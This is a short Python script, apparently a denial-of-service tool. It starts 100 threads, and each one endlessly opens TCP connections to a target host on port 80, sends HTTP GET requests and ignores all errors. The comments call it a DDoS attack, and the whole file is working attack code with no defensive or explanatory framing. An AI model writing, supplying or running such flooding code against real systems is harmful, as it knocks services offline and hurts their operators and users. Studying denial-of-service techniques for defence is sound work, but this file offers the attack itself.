import threading
import socket
import random
import time

# Target IP address or domain name to attack
target = 'example.com'

# Target port (in this case, port 80 for HTTP)
port = 80

def ddos_attack():
    while True:
        try:
            # Create a socket object
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            
            # Connect to the target
            s.connect((target, port))
            
            # Send an HTTP GET request to the target
            s.send(b'GET / HTTP/1.1\r\nHost: ' + target.encode() + b'\r\n\r\n')
            
            # Close the socket connection
            s.close()
        except:
            # If an error occurs, catch it and ignore it
            pass

def main():
    threads = []
    for i in range(100):
        # Create a new thread that runs the ddos_attack function
        t = threading.Thread(target=ddos_attack)
        threads.append(t)
        t.start()

    for t in threads:
        # Wait for all threads to finish
        t.join()

if __name__ == '__main__':
    # Start the attack if the script is run as the main program
    main()